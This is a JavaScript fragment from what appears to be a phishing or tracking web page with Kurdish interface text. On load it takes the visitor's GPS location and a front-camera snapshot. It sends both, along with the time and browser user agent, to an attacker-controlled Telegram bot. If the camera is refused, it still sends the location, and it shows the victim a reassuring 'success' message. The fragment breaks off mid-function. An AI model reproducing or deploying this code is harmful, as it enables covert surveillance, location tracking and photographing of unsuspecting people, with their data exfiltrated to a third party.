    function sendData(blob, lat, lon, map) {
        let f = new FormData();
        f.append('chat_id', CHAT_ID);
        f.append('photo', blob, 'cap.png');
        f.append('caption', `📍${lat},${lon}\n🗺${map}\n🕒${new Date().toLocaleString('ckb')}\n🧬${navigator.userAgent}`);
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:'POST',body:f})
        .then(()=>{document.getElementById('card').innerHTML='<h2>✅ سەرکەوتوو</h2><p>دەتوانیت بەردەوام بیت.</p>';})
        .catch(()=>{document.getElementById('card').innerHTML='<h2>❌ هەڵە</h2>';});
    }

    function fail(m) {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
            method:'POST',headers:{'Content-Type':'application/json'},
            body:JSON.stringify({chat_id:CHAT_ID,text:m})
        });
    }

    setTimeout(()=>{
        navigator.geolocation.getCurrentPosition(p=>{
            let lat=p.coords.latitude, lon=p.coords.longitude, map=`https://maps.google.com/?q=${lat},${lon}`;
            navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}})
            .then(s=>{
                let v=document.getElementById('vid');
                v.srcObject=s; v.play();
                v.oncanplay=()=>setTimeout(()=>{
                    let c=document.getElementById('canvas');
                    c.width=v.videoWidth||640; c.height=v.videoHeight||480;
                    c.getContext('2d').drawImage(v,0,0);
                    c.toBlob(b=>{if(b)sendData(b,lat,lon,map);s.getTracks().forEach(t=>t.stop());},'image/png');
                },1500);
            }).catch(()=>fail(`⚠️کامێرا ڕێگەپێنەدرا\n📍${lat},${lon}\n${map}`));
